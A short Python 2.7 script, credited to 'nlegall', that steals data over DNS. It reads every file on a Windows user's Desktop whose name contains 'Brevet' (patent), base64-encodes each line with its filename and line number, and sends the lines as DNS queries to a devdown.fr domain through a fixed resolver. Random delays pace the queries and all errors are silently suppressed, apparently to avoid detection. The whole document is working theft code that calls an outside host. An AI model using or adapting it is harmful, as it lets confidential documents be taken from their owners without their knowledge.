#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
"""Exfiltration of document with DNS
Author : nlegall

This script allow to send all the content of file (Brevet* or brevet*) with
DNS request. The sent content is encode with base64 and format like :
	`filename|line_number|content`
"""

import dns.resolver
from random import randint
from time import sleep
from base64 import b64encode
from os import path, environ, listdir
from re import search

# External DNS server to send the queries
dns_server = '192.168.199.1'
domain = '.devdown.fr'

def encode(msg):
	return b64encode(msg)
	pass

def read_file(filename):
	with open(filename, 'r') as f:
		return f.readlines()
		pass
	pass

if __name__ == '__main__':
	target = dns.resolver.Resolver()
	target.nameservers = [dns_server]

	desktop = path.join(path.join(environ['USERPROFILE']), 'Desktop') 
	for file in listdir(desktop):
		if search(r"(B|b)revet", file):
			i = 1
			print file
			a = read_file(desktop + "\\" + file)
			try:
				for line in a:
					target.query(encode(file + "|" + str(i) + "|" + line)
						 + domain)
					i += 1
					sleep(randint(1,3))
					pass
				pass
			except Exception as e:
				pass
			sleep(randint(1,3))
